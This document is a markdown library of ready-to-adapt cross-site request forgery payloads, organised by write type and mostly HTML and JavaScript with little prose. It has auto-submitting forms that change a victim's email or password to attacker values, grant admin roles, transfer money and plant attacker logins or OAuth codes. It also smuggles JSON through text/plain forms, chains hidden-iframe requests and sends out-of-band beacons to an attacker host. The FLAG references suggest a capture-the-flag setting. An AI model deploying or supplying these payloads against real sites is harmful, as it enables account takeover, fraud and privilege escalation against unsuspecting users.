# Payload variants — the complete form/body library by write-type

Ready-to-adapt delivery pages, one per write-shape, each with the
assembled body it produces.

---

## A. The urlencoded writes — field-based

```html
<!-- email-change -->
<form action="/change-email" method=POST>
<input name=email value="attacker@evil.com"></form>

<!-- password-change -->
<form action="/change-password" method=POST>
<input name=new_password value="hax123">
<input name=confirm_password value="hax123"></form>

<!-- role-grant -->
<form action="/admin/role" method=POST>
<input name=user value="attacker"><input name=role value="admin"></form>

<!-- transfer -->
<form action="/transfer" method=POST>
<input name=to value="attacker"><input name=amount value="999"></form>

<!-- privacy-toggle -->
<form action="/settings" method=POST>
<input name=public value="true"><input name=visibility value="public"></form>

<!-- flag-submit -->
<form action="/submit" method=POST>
<input name=answer value="FLAG{x}"><input name=challenge value="c"></form>

<!-- message-send -->
<form action="/message" method=POST>
<input name=to value="attacker"><input name=body value="flag here"></form>

<!-- share-grant -->
<form action="/share" method=POST>
<input name=user value="attacker"><input name=object value="123"></form>

<!-- webhook-plant (a URL the server later fetches) -->
<form action="/webhook" method=POST>
<input name=url value="https://attacker/x"></form>

<!-- delete -->
<form action="/delete" method=POST>
<input name=id value="123"><input name=confirm value="true"></form>

<!-- approve -->
<form action="/approve" method=POST>
<input name=request value="456"><input name=approved value="true"></form>
```

## B. The text/plain JSON writes — the `=` assemblies

```html
<!-- a single-field write -->
<input name='{"email":"' value='=attacker@evil.com"}'>
<!-- {"email":"=attacker@evil.com"} -->

<!-- a two-field write, = inside a real field -->
<input name='{"user":"attacker","pass":"x' value='=y"}'>
<!-- {"user":"attacker","pass":"x=y"} -->

<!-- a role-grant, = inside a string -->
<input name='{"user":"attacker","role":"' value='=admin"}'>
<!-- {"user":"attacker","role":"=admin"} -->

<!-- a config-write with a number -->
<input name='{"debug":true,"s":"' value='","level":9}'>
<!-- {"debug":true,"s":"=","level":9} -->

<!-- a nested write -->
<input name='{"cfg":{"public":"' value='=true"}}'>
<!-- {"cfg":{"public":"=true"}} -->

<!-- a machine-register (the card shape) -->
<input name='{"machine_id":"host-x","action":"start","i":"' value='"}'>
<!-- {"machine_id":"host-x","action":"start","i":"="} -->

<!-- a flag-submit JSON -->
<input name='{"answer":"FLAG{x}","i":"' value='"}'>
<!-- {"answer":"FLAG{x}","i":"="} -->
```

## C. The GET-write carriers — top-nav shapes

```html
<!-- a delete-link -->
<script>location='https://t/delete?id=1'</script>

<!-- a transfer-GET -->
<script>location='https://t/transfer?to=me&amount=999'</script>

<!-- a flag-submit-GET -->
<script>location='https://t/submit?answer=FLAG{x}&c=y'</script>

<!-- an approve-GET -->
<meta http-equiv=refresh content="0;url=https://t/approve?id=1">

<!-- a form GET -->
<form action="https://t/transfer" method=GET>
<input name=to value=me><input name=amount value=1></form>
<script>document.forms[0].submit()</script>
```

## D. The login-CSRF shapes — credential plants

```html
<!-- urlencoded login -->
<form action="/login" method=POST>
<input name=username value="attacker">
<input name=password value="attackerpass"></form>

<!-- JSON login text/plain -->
<form action="/sso/login" method=POST enctype=text/plain>
<input name='{"u":"me","p":"x","i":"' value='"}'></form>

<!-- an OAuth callback plant -->
<script>location='https://sso/callback?code=<attacker-code>&state=x'</script>
```

## E. The cookie-plant shapes — double-submit

```html
<!-- a subdomain cookie-set + matching form -->
<img src="https://sub.t/set-cookie?csrf=x">
<form action="/x" method=POST><input name=csrf value=x>
<input name=a value=1></form>

<!-- a cookie-injection + matching form -->
<img src="https://t/reflect?in=Set-Cookie:%20csrf=x">
<form action="/x" method=POST><input name=csrf value=x>
<input name=a value=1></form>
```

## F. The multipart shapes — file+field writes

```html
<!-- an upload -->
<form action="/upload" method=POST enctype=multipart/form-data>
<input type=file name=f><input name=cfg value='{"a":1}'></form>

<!-- a multipart field carrying JSON -->
<form action="/update" method=POST enctype=multipart/form-data>
<input name=config value='{"a":1}'></form>
```

## G. The multi-form chains — sequential writes

```html
<!-- two independent writes -->
<iframe name=w1 style=display:none></iframe>
<iframe name=w2 style=display:none></iframe>
<form target=w1 action="/a" method=POST><input name=x value=1></form>
<form target=w2 action="/b" method=POST><input name=y value=2></form>
<script>document.querySelectorAll('form').forEach(f=>f.submit())</script>

<!-- sequenced — B after A's load -->
<iframe name=w1 onload="document.forms[1].submit()" style=display:none></iframe>
<iframe name=w2 style=display:none></iframe>
<form target=w1 action="/step1" method=POST><input name=a value=1></form>
<form target=w2 action="/step2" method=POST><input name=b value=2></form>
<script>document.forms[0].submit()</script>
```

## H. The fetch/beacon shapes — JS carriers

```js
// fetch no-cors text/plain JSON
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"a":1,"i":"="}'})

// fetch no-cors urlencoded
fetch('https://t/x',{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'a=1&b=2'})

// sendBeacon — unload-safe
navigator.sendBeacon('https://t/x',new Blob(['{"a":1,"i":"="}'],{type:'text/plain'}))
navigator.sendBeacon('https://t/x','a=1')
```

## I. The composite bot-delivery page — the full template

```html
<!doctype html><html><head>
<meta name=referrer content=no-referrer>
</head><body>
<form id=f action="WRITE_URL" method=POST enctype=text/plain>
<input name='{"FIELD":"' value='VALUE","i":"'}'>
</form>
<script>
  document.getElementById('f').submit();
  fetch('https://attacker/hit?d=1',{mode:'no-cors'});   // OOB beacon
</script>
</body></html>
```

## J. The data: URL — the self-contained page

```
data:text/html,<meta name=referrer content=no-referrer><form action="WRITE_URL" method=POST><input name=a value=1></form><script>document.forms[0].submit()</script>
```
